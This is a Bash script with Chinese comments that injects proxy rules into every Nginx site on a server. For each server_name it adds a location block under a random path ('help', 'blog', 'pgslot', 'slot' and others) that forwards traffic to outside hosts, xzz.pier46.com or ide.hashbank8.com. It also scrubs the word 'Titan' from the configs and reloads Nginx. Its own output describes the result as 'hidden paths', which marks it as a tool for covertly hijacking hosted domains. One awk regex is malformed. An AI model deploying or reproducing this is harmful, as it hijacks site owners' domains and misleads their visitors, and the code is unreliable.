#!/bin/bash
# 文件名：nginx_per_domain_com_in.sh
# 功能：对每个 server_name 单独生成 location 规则（.in 和 .com 完全独立）
# 作者：2025最新终极版
NGINX_DIR="/etc/nginx/sites-enabled"
COM_PATHS=("help" "news" "page" "blog" "bangzhuzhongxin" "zh" "pc")
IN_PATHS=("pg" "pgslot" "slot")
declare -A FINAL_MAP
COM_TEMPLATE=$(cat <<'EOF'
    location /%PATH%/ {
        if ($host ~* ^%DOMAIN%$) {
            set $fullurl "$scheme://$host$request_uri";
            rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        }
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }
EOF
)
IN_TEMPLATE=$(cat <<'EOF'
    location /%PATH%/ {
        if ($host ~* ^%DOMAIN%$) {
            set $fullurl "$scheme://$host$request_uri";
            rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        }
        proxy_set_header Host ide.hashbank8.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://ide.hashbank8.com;
    }
EOF
)
echo "开始处理所有站点，对每个 server_name 单独生成 location 规则"
echo "================================================================="
find "$NGINX_DIR" \( -type f -o -type l \) -print0 2>/dev/null | while IFS= read -r -d '' file; do
    [[ -f "$file" || -L "$file" ]] || continue
    filename=$(basename "$file")
    echo "正在处理 → $filename"
    # 提取所有域名（支持多行 server_name、去重）
    domains=$(awk '
        tolower($0) ~ /^[[:space:]]*server_name/ {
            gsub(/^.*server_name[[:space:]]+/,"");
            gsub(/;.*$,"");
            print
        }
    ' "$file" | tr ' ' '\n' | grep -v '^$' | sort -u)
    # 为当前配置文件生成所有 location 块
    all_locations=""
    for domain in $domains; do
        domain_lower=$(echo "$domain" | tr '[:upper:]' '[:lower:]')
        if [[ "$domain_lower" == *.in ]]; then
            path="${IN_PATHS[$RANDOM % ${#IN_PATHS[@]}]}"
            template="$IN_TEMPLATE"
            backend="ide.hashbank8.com"
            echo " ✓ $domain → /$path/ → ide.hashbank8.com"
        else
            path="${COM_PATHS[$RANDOM % ${#COM_PATHS[@]}]}"
            template="$COM_TEMPLATE"
            backend="xzz.pier46.com"
            echo " ✓ $domain → /$path/ → xzz.pier46.com"
        fi
        # 生成单条 location
        location_block=$(echo "$template" | sed "s/%PATH%/$path/g; s/%DOMAIN%/$domain/g")
        all_locations+="$location_block\n"
        # 记录到全局映射表
        FINAL_MAP["$domain"]="/$path/ → $backend"
    done
    # 将所有 location 一次性插入到 server_name 行之后
    tmp=$(mktemp)
    awk -v blocks="$all_locations" '
    {
        print
        if ($0 ~ /^[[:space:]]*server_name.*;.*$/) {
            print blocks
            print ""
        }
    }' "$file" > "$tmp"
    # 清理 Titan 字样 + 多余空行
    sed -i 's/[Tt][Ii][Tt][Aa][Nn]//gi; /^$/d' "$tmp" 2>/dev/null
    # 写入配置
    if ! cmp -s "$tmp" "$file" 2>/dev/null; then
        mv "$tmp" "$file"
        echo -e "\033[32m 成功更新 $filename（共 $(echo "$domains" | wc -l) 个域名）\033[0m\n"
    else
        rm -f "$tmp"
        echo -e "\033[33m 已存在，无需重复写入\033[0m\n"
    fi
done
# 重载 Nginx
echo "正在重载 Nginx..."
if nginx -t >/dev/null 2>&1; then
    systemctl reload nginx 2>/dev/null || nginx -s reload 2>/dev/null
    echo -e "\033[32mNginx 配置正确，已平滑重载成功！\033[0m"
else
    echo -e "\033[31mNginx 配置错误！请手动执行：nginx -t 查看详情\033[0m"
    exit 1
fi
# 输出最终映射表（按域名排序）
echo ""
echo "最终每个域名独立路径分配结果"
echo "============================================================================"
printf "%-50s → \033[1;33m%-30s\033[0m\n" "域名" "访问路径 + 后端"
echo "----------------------------------------------------------------------------"
for domain in $(printf '%s\n' "${!FINAL_MAP[@]}" | LC_ALL=C sort); do
    printf "%-50s → \033[1;33m%s\033[0m\n" "$domain" "${FINAL_MAP[$domain]}"
done
echo "----------------------------------------------------------------------------"
echo "总计独立域名数：${#FINAL_MAP[@]} 个"
echo ".com 类路径池：help news page blog bangzhuzhongxin zh pc"
echo ".in 类路径池：pg pgslot slot"
echo "============================================================================"
echo -e "\n脚本执行完成！现在每个域名都有自己独立的隐蔽路径和后端\n"
exit 0
